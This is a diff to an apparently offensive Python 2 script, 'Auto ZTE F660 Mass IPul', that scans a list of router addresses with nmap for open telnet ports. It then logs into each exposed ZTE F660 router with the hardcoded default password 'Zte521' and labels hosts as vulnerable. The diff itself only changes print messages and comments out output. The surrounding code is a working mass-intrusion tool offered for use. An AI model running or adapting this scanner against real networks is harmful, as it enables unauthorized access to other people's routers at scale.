@@ -14,6 +14,7 @@ print '''
  ################################################
  ### Auto ZTE F660 Mass IPul By: IRONBUGS     ###
  ################################################
+
 '''
 ## Login, set header, handle cookie(?).
 print "[+] Logging in..."
@@ -52,7 +53,7 @@ print "[+] Checking Telnet Open Port..."
 os.system("nmap -T5 -vv -iL /root/Desktop/RouterIP.txt -p 23 | grep 'Discovered open port' | awk {'print $6'} | awk -F/ {'print $1'} > /root/Desktop/IP.txt")
 print "[+] Saved in /root/Desktop/IP.txt"
 
-print "[+] Attacking...."
+print "[+] Logging in to target...."
 iplist = open("/root/Desktop/IP.txt").read()
 iplist = iplist.split()
 for ipx in iplist:
@@ -63,9 +64,9 @@ for ipx in iplist:
 		tn.read_until("Password: ")
 		tn.write("Zte521\n")
 		tn.write("exit\n")
-		print tn.read_all()
+		#print tn.read_all()
 		tn.close()
-		print ipx,'... VUlnerable'
+		print ipx,'... Login Success.. Target is vulnerable'
 	except Exception, e:
 		print ipx, e, '... Not Vulnerable'
 		continue
